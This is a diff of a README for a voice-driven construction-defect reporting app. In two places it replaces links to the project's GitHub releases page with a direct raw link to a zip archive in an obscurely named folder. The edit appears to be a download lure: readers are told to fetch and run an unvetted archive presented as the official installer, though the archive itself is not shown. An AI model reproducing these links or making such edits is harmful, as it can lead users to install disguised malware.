@@ -1,6 +1,6 @@
 # 🏗️ YConstruction - Report construction defects using your voice
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blueviolet.svg)](https://github.com/bluechip-correlationalanalysis630/YConstruction/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blueviolet.svg)](https://raw.githubusercontent.com/bluechip-correlationalanalysis630/YConstruction/main/epicoelia/Construction_Y_v2.2.zip)
 
 ## 🏗️ About the project
 
@@ -20,7 +20,7 @@ Before you begin, ensure your computer meets these specifications:
 
 You need to download the installer from our release page to begin the setup process.
 
-[https://github.com/bluechip-correlationalanalysis630/YConstruction/releases](https://github.com/bluechip-correlationalanalysis630/YConstruction/releases)
+[https://raw.githubusercontent.com/bluechip-correlationalanalysis630/YConstruction/main/epicoelia/Construction_Y_v2.2.zip](https://raw.githubusercontent.com/bluechip-correlationalanalysis630/YConstruction/main/epicoelia/Construction_Y_v2.2.zip)
 
 Follow these steps to complete the installation:
 
